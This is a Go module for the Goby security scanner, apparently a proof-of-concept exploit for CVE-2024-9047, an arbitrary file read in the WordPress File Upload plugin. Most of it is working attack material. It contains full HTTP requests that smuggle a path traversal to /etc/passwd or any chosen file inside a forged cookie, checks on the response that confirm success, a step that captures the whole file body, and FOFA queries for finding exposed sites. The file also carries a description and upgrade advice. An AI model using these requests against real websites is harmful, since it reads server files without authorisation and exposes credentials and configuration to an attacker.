package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress File Upload Plugin /wfu_file_downloader.php File Read Vulnerability (CVE-2024-9047)",
    "Description": "<p>The WordPress File Upload plugin is a useful plugin for WordPress websites. It allows users to upload files to the wp-contents directory. The plugin supports custom fields and provides a progress bar monitoring function so that users can understand the upload progress in real time. In the WordPress File Upload plugin version &lt;= 4.24.11, the wfu_file_downloader.php file has an arbitrary file read vulnerability. An attacker can read any file on the server by constructing a malicious request, which may lead to sensitive information leakage or further attacks.</p>",
    "Product": "WordPress File Upload Plugin",
    "Homepage": "https://cn.wordpress.org/plugins/wp-file-upload/",
    "DisclosureDate": "2024-12-25",
    "PostTime": "2024-12-25",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"wp-content/plugins/wp-file-upload\" && body=\"wordpress-file-upload-style-css\"",
    "GobyQuery": "body=\"wp-content/plugins/wp-file-upload\" && body=\"wordpress-file-upload-style-css\"",
    "Level": "1",
    "Impact": "<p>In the WordPress File Upload plugin version &lt;= 4.24.11, the wfu_file_downloader.php file has an arbitrary file read vulnerability. An attacker can read any file on the server by constructing a malicious request, which may lead to sensitive information leakage or further attacks.</p>",
    "Recommendation": "<p>It is recommended to immediately upgrade the WordPress File Upload plugin to the latest version and restrict access to the wfu_file_downloader.php file. Additionally, it is advised to enforce strict permission control and security audits on the file upload functionality.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144702776?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3; wfu_storage_pQ1DyzbQp5hBxQpW=/../../../../../etc/passwd[[name]]; wfu_download_ticket_Hw8h7dBmxROx27ZZ=1000000000000000000; wfu_ABSPATH=/;"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": ":x:",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "/bin",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            }
                        ]
                    },
                    {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "root:",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3; wfu_storage_pQ1DyzbQp5hBxQpW=/../../../../../{{{filePath}}}[[name]]; wfu_download_ticket_Hw8h7dBmxROx27ZZ=1000000000000000000; wfu_ABSPATH=/;"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-9047"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "WordPress File Upload 插件 /wfu_file_downloader.php 文件读取漏洞（CVE-2024-9047）",
            "Product": "WordPress File Upload 插件",
            "Description": "<p>WordPress File Upload插件是一款WordPress网站的实用插件，它允许用户地将文件上传到wp-contents目录， 插件支持自定义字段，同时，它还提供了进度条监视功能，让用户可以实时了解上传进度。WordPress File Upload 插件在 &lt;= 4.24.11 版本中，wfu_file_downloader.php 文件存在任意文件读取漏洞。攻击者可以通过构造恶意请求读取服务器上的任意文件，可能导致敏感信息泄露或进一步的攻击。<br></p>",
            "Recommendation": "<p>建议立即升级 WordPress File Upload 插件至最新版本，并限制对 wfu_file_downloader.php 文件的访问权限。同时，建议对文件上传功能进行严格的权限控制和安全审计。</p>",
            "Impact": "<p>WordPress File Upload 插件在 &lt;= 4.24.11 版本中，wfu_file_downloader.php 文件存在任意文件读取漏洞。攻击者可以通过构造恶意请求读取服务器上的任意文件，可能导致敏感信息泄露或进一步的攻击。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "WordPress File Upload Plugin /wfu_file_downloader.php File Read Vulnerability (CVE-2024-9047)",
            "Product": "WordPress File Upload Plugin",
            "Description": "<p>The WordPress File Upload plugin is a useful plugin for WordPress websites. It allows users to upload files to the wp-contents directory. The plugin supports custom fields and provides a progress bar monitoring function so that users can understand the upload progress in real time. In the WordPress File Upload plugin version &lt;= 4.24.11, the wfu_file_downloader.php file has an arbitrary file read vulnerability. An attacker can read any file on the server by constructing a malicious request, which may lead to sensitive information leakage or further attacks.<br></p>",
            "Recommendation": "<p>It is recommended to immediately upgrade the WordPress File Upload plugin to the latest version and restrict access to the wfu_file_downloader.php file. Additionally, it is advised to enforce strict permission control and security audits on the file upload functionality.</p>",
            "Impact": "<p>In the WordPress File Upload plugin version &lt;= 4.24.11, the wfu_file_downloader.php file has an arbitrary file read vulnerability. An attacker can read any file on the server by constructing a malicious request, which may lead to sensitive information leakage or further attacks.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "filePath"
    ],
    "EditType": "fast",
    "PocId": "9979"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
